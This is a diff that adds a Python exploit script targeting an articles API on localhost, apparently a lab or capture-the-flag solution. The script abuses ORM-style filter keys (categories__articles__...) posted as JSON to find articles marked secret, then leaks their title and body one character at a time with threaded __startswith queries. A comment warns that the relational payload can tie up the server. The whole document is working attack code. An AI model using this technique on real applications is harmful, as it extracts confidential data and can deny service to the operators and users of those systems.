@@ -1,0 +1,87 @@
+import requests, string, sys
+from colorama import Fore, Style
+from concurrent.futures import ThreadPoolExecutor, Future
+
+TARGET = "http://127.0.0.1:8000/api/articles/"
+CHARS = {
+    "title": string.ascii_letters + " .",
+    "body": string.ascii_letters + string.digits + " .",
+}
+THREADS = 20
+
+def send_payload(payload: dict) -> list:
+    r = requests.post(TARGET, json=payload, timeout=8)
+    return r.json()
+
+
+def worker(base_payload: str, id: int, column_to_leak: str, test_substring_value: str) -> tuple[bool, str]:
+    payload = {
+        f"{base_payload}__{column_to_leak}__startswith": test_substring_value,
+        f"{base_payload}__id": id
+    }
+    r_json = send_payload(payload)
+    return len(r_json) > 0, test_substring_value
+
+
+def get_secret_article_ids(base_payload: str, max_ids: int = 10) -> list[int]:
+    ids = []
+    for id in range(max_ids):
+        payload = {
+            f"{base_payload}__id": id,
+            f"{base_payload}__is_secret": int(True)
+        }
+        r_json = send_payload(payload)
+        if len(r_json) > 0:
+            ids.append(id)
+    return ids
+
+
+def exploit(base_payload: str, id: int, column_to_leak: str):
+    chars = CHARS[column_to_leak]
+    dumped_value = ""
+    print(f"\r{Fore.GREEN}article id: {Fore.CYAN}{Style.BRIGHT}{id}{Style.RESET_ALL} {Fore.GREEN}dumped {column_to_leak}: {Fore.CYAN}{Style.BRIGHT}{dumped_value}{Style.RESET_ALL}", end="")
+    sys.stdout.flush()
+    while True:
+        found = False
+        with ThreadPoolExecutor(max_workers=THREADS) as executor:
+            futures = []
+            for test_char in chars:
+                # Using startswith operator so only add test char to end
+                job_suffix = executor.submit(worker, base_payload, id, column_to_leak, dumped_value + test_char)
+                futures.append(job_suffix)
+
+            future: Future
+            for future in futures:
+                result = future.result()
+                was_success = result[0]
+                test_substring = result[1]
+                print(f"\r{Fore.GREEN}article id: {Fore.CYAN}{Style.BRIGHT}{id}{Style.RESET_ALL} {Fore.GREEN}dumped {column_to_leak}: {Fore.CYAN}{Style.BRIGHT}{test_substring}{Style.RESET_ALL}", end="")
+                sys.stdout.flush()
+                if was_success:
+                    found = True
+                    dumped_value = test_substring
+                    executor.shutdown(wait=False, cancel_futures=True)
+                    break
+
+        if not found:
+            break
+
+    print(f"\r{Fore.GREEN}article id: {Fore.CYAN}{Style.BRIGHT}{id}{Style.RESET_ALL} {Fore.GREEN}dumped {column_to_leak}: {Fore.CYAN}{Style.BRIGHT}{dumped_value} {Style.RESET_ALL}")
+
+
+def main():
+    base_payload = "categories__articles"
+    try:
+        article_ids = get_secret_article_ids(base_payload)
+    except requests.exceptions.ReadTimeout as e:
+        print(f"{Fore.RED}{Style.BRIGHT}base payload has too many m2m loop backs and is now dosing the server{Style.RESET_ALL}")
+        return
+
+    for article_id in article_ids:
+        print(f"{Fore.GREEN}{Style.BRIGHT}Found secret article with id: {article_id}{Style.RESET_ALL}")
+        exploit(base_payload, article_id, "title")
+        exploit(base_payload, article_id, "body")
+
+
+if __name__ == "__main__":
+    main()
